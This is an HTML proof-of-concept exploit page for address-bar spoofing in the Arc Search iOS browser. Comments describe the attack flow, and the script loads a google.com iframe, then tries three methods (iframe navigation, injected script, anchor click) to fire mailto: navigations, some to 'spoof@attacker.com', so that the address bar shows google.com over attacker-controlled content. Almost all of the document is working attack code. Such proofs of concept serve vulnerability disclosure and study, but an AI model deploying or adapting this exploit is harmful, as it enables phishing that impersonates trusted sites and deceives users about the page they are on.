<!--
  ATTACK FLOW:
  1. User opens THIS page (attacker.github.io) in Arc Search iOS
  2. victim iframe (google.com/csi) loads → triggers mailto: nav on load
  3. Arc Navigation Delegate reads iframe origin → victim.com/google.com
  4. Address bar updates to google.com
  5. Attacker overlays fake content on top (or victim page itself is the content)

  WHY mailto: instead of geo:
  - mailto: is more universally handled by WKWebView navigation delegate
  - Less likely to open external app (Mail.app), more likely to just fire nav event
  - email:// is non-standard, use mailto: which is RFC-standard
-->

<!--
  STEP 1: Hidden iframe of victim (google.com or any trusted domain)
  This iframe fires mailto: on load → triggers address bar update
-->
<iframe
  id="victim-iframe"
  src="https://www.google.com/csi"
  style="position:fixed;inset:0;width:100%;height:100%;border:none;z-index:1;"
  sandbox="allow-scripts allow-same-origin allow-top-navigation-by-user-activation"
></iframe>

<!--
  STEP 2: Attacker content overlaid on top
  User sees THIS, but address bar shows google.com
-->

<script>
  // Trigger mailto: from the victim iframe context
  // We do this by posting a message to the iframe OR by navigating the iframe
  const victimFrame = document.getElementById('victim-iframe');

  victimFrame.addEventListener('load', function() {
    // Once victim iframe loads (google.com/csi), inject navigation trigger
    // The iframe's origin is google.com — so when navigation delegate fires,
    // it reads google.com as the origin → address bar = google.com

    try {
      // Method 1: navigate iframe to mailto: (triggers nav delegate with google.com origin)
      victimFrame.contentWindow.location.href = 'mailto:test@example.com';
    } catch(e) {
      // Cross-origin blocked — try srcdoc replacement
      console.log('Method 1 failed:', e.message);
    }

    // Method 2: create a child iframe inside that fires mailto:
    // (if cross-origin access blocked)
    try {
      const doc = victimFrame.contentDocument;
      if (doc) {
        const script = doc.createElement('script');
        script.textContent = "location.href='mailto:a@b.com'";
        doc.head.appendChild(script);
      }
    } catch(e) {
      console.log('Method 2 failed:', e.message);
    }
  });

  // Method 3: Use srcdoc iframe that CLAIMS to be from google context
  // by navigating through google.com first then to mailto:
  setTimeout(function() {
    // Create a new iframe that navigates: google.com/csi → mailto:
    const f2 = document.createElement('iframe');
    f2.style.cssText = 'display:none;';
    f2.src = 'https://www.google.com/csi';
    document.body.appendChild(f2);
    f2.onload = function() {
      try {
        f2.contentWindow.location.href = 'mailto:spoof@attacker.com';
      } catch(e) {}
      // Also try via anchor click inside iframe
      try {
        const a = f2.contentDocument.createElement('a');
        a.href = 'mailto:spoof@attacker.com';
        f2.contentDocument.body.appendChild(a);
        a.click();
      } catch(e) {}
    };
  }, 300);
</script>
